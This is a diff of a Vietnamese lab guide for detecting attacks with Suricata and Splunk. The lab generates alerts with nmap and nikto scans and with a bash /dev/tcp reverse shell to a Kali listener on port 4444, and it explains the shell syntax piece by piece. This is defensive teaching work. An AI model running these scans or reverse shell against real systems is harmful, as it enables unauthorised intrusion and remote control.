@@ -13,7 +13,8 @@
   Một rule bao gồm hai phần chính:
   - Rule Header: Xác định hành động (alert, drop, pass, reject), giao thức (TCP, UDP, ICMP...), địa chỉ IP (nguồn/đích) và cổng.
   - Rule Options: Chứa nội dung cụ thể để đối khớp (như từ khóa `content`, `msg` để hiển thị cảnh báo, `sid` để định danh luật).
-  Emerging Threats (ET): Bộ luật phổ biến nhất, có cả phiên bản miễn phí (ET Open) và trả phí (ET Pro).
+
+Emerging Threats (ET): Bộ luật phổ biến nhất, có cả phiên bản miễn phí (ET Open) và trả phí (ET Pro).
 
 ## 1. Cấu hình trên Splunk
 
@@ -63,7 +64,7 @@ sudo apt install -y suricata jq
 sudo systemctl enable --now suricata
 ```
 
-### Bước 2: Chọn đúng interface để bắt gói (rất quan trọng)
+### Bước 2: Chọn đúng interface để bắt gói
 
 - Xem interface nào có IP `192.168.60.40`:
 
@@ -216,7 +217,7 @@ nmap -sS -T4 -p- 192.168.60.40
 - Có thể vừa scan vừa mở `sudo tail -f /var/log/suricata/eve.json` để xem log đổ vào trực
   tiếp.
 
-![image.png](images/images/image%201.png)
+![image.png](images/image%201.png)
 
 → Tìm thấy cổng 22 đang mở
 
@@ -224,6 +225,7 @@ nmap -sS -T4 -p- 192.168.60.40
 
 - **Mục tiêu:** Tạo ra lưu lượng HTTP lớn trong thời gian ngắn để kích hoạt các rule về DoS hoặc lưu lượng bất thường.
 - **Chuẩn bị:** Đảm bảo máy Ubuntu Victim (192.168.60.40) đang chạy một Web Server (Apache hoặc Nginx). Nếu chưa có, hãy cài nhanh trên Ubuntu:
+
   ```powershell
   # 1. Cài đặt Apache
   sudo apt update
@@ -233,13 +235,14 @@ nmap -sS -T4 -p- 192.168.60.40
   sudo systemctl enable --now apache2
   sudo systemctl status apache2
   ```
+
 - **Dùng Nikto (Tạo nhiều Alert về Scan/Web Attack)**
   Lệnh này sẽ quét server và tạo ra hàng trăm request chứa các mẫu tấn công đã biết.
-      ```powershell
-      nikto -h http://192.168.60.40
-      ```
+  `powershell
+nikto -h http://192.168.60.40
+`
 
-![image.png](images/image%202.png)
+  ![image.png](images/image%202.png)
 
 - Chỉ trong 11 giây mà nikto đã bắn tới 8102 gói tin HTTP vào máy chủ ubuntu
 
@@ -248,16 +251,18 @@ nmap -sS -T4 -p- 192.168.60.40
 - **Mục tiêu:** Mô phỏng việc kẻ tấn công dụ nạn nhân chạy mã độc, khiến máy nạn nhân (Ubuntu) kết nối ngược về máy tấn công (Kali), cho phép kẻ tấn công điều khiển dòng lệnh.
 - **Trên máy Kali Attacker**
   Mở một cổng lắng nghe (Listener) để chờ kết nối từ nạn nhân.
-      ```powershell
-      # Lắng nghe trên cổng 4444
-      nc -nvlp 4444
-      ```
+  `powershell
+  # Lắng nghe trên cổng 4444
+  nc -nvlp 4444
+  `
 - **Trên máy Ubuntu victim**
   Trong thực tế, bước này xảy ra khi người dùng click vào file độc hại hoặc bị khai thác lỗ hổng web. Trong Lab, chúng ta sẽ tự chạy lệnh này để mô phỏng (Simulate).
 - Mở terminal trên Ubuntu và chạy lệnh sau:
+
   ```powershell
   bash -i >& /dev/tcp/192.168.60.10/4444 0>&1
   ```
+
   - `bash -i` (Tạo Shell tương tác)
     - **`bash`**: Gọi chương trình Bash (Bourne Again Shell), là trình thông dịch lệnh mặc định trên Linux.
     - **`i` (interactive)**: Chế độ "tương tác". Bình thường, khi bạn chạy một script, bash chạy xong sẽ tắt. Cờ `i` bắt buộc bash phải giữ phiên làm việc mở, hiển thị dấu nhắc lệnh (prompt) và chờ người dùng nhập lệnh tiếp theo. Điều này giúp hacker có cảm giác như đang ngồi trực tiếp trước máy nạn nhân.
@@ -276,6 +281,7 @@ nmap -sS -T4 -p- 192.168.60.40
     - **`>&1`**: Lấy Stdin gắn vào nơi mà Stdout đang trỏ tới.
     - Vì Stdout (ở bước 3) đã được nối tới máy Kali, nên lệnh này sẽ nối luôn Stdin tới máy Kali.
     - **Kết quả:** Bất cứ gì bạn gõ từ máy Kali sẽ được gửi qua mạng và "nhập" vào máy Ubuntu như thể bạn đang gõ bàn phím tại đó.
+
 - **Quay lại máy Kali**
   Bạn sẽ thấy thông báo kết nối thành công. Thử gõ `ls` hoặc `whoami` trên Kali, bạn sẽ thấy kết quả trả về từ máy Ubuntu.
 
